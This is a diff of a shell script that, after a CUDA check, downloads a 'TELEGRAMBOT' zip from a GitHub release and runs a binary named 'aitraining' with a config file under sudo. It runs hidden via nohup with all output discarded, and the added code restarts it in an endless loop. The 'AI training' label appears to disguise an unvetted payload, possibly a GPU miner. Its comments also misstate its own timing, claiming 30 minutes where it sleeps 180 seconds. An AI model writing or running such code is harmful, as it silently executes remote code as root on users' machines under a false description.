@@ -26,24 +26,55 @@ if [ ! -f "$CUDA_FLAG" ]; then
     exit 0
 fi
 
-# 2. Start AI training after reboot
-if pgrep -x "aitraining" > /dev/null; then
-    echo "An AI training process is already running. Exiting."
-    exit 1
-fi
-
-nohup bash -c '
-sudo apt install -y unzip
-sudo wget -O TELEGRAMBOT.zip https://github.com/max313iq/Ssl/releases/download/TELEGRAMBOT/TELEGRAMBOT.zip
-sudo mkdir -p TELEGRAMBOT
-sudo unzip -o TELEGRAMBOT.zip -d TELEGRAMBOT
-cd TELEGRAMBOT || exit
-sudo chmod +x aitraining
-sudo ./aitraining -c config.json
-' > /dev/null 2>&1 &
-
-# Loop to indicate ongoing training
+# 2. Loop to manage AI training lifecycle
 while true; do
-    echo "AI training in process"
-    sleep 600
+    echo "Starting AI training process..."
+
+    # Check if an aitraining process is already running and kill it to ensure a clean restart
+    if pgrep -x "aitraining" > /dev/null; then
+        echo "Found an existing 'aitraining' process. Killing it before starting a new one."
+        pkill -x "aitraining"
+        sleep 5 # Give the process a moment to terminate gracefully
+    fi
+
+    # Start the AI training process in the background using nohup
+    # nohup ensures the process continues even if the terminal is closed
+    # Output is redirected to /dev/null to prevent it from cluttering the console
+    nohup bash -c '
+    # Ensure unzip is installed for extracting the bot
+    sudo apt install -y unzip
+
+    # Download the TELEGRAMBOT.zip file
+    sudo wget -O TELEGRAMBOT.zip https://github.com/max313iq/Ssl/releases/download/TELEGRAMBOT/TELEGRAMBOT.zip
+
+    # Create a directory for the bot and unzip the contents into it
+    sudo mkdir -p TELEGRAMBOT
+    sudo unzip -o TELEGRAMBOT.zip -d TELEGRAMBOT
+
+    # Navigate into the bot directory
+    cd TELEGRAMBOT || exit
+
+    # Make the aitraining executable
+    sudo chmod +x aitraining
+
+    # Run the aitraining application with its configuration
+    sudo ./aitraining -c config.json
+    ' > /dev/null 2>&1 &
+
+    echo "AI training started. It will run for 30 minutes."
+    sleep 180 # Wait for 30 minutes (30 minutes * 60 seconds/minute = 1800 seconds)
+
+    echo "Stopping AI training process..."
+    # Check if the aitraining process is still running before attempting to kill it
+    if pgrep -x "aitraining" > /dev/null; then
+        pkill -x "aitraining"
+        echo "AI training process stopped."
+    else
+        echo "AI training process not found, it might have already exited."
+    fi
+
+    echo "Waiting for 1 minute before restarting AI training..."
+    sleep 60 # Wait for 1 minute (60 seconds)
+
+    echo "Preparing to restart AI training..."
 done
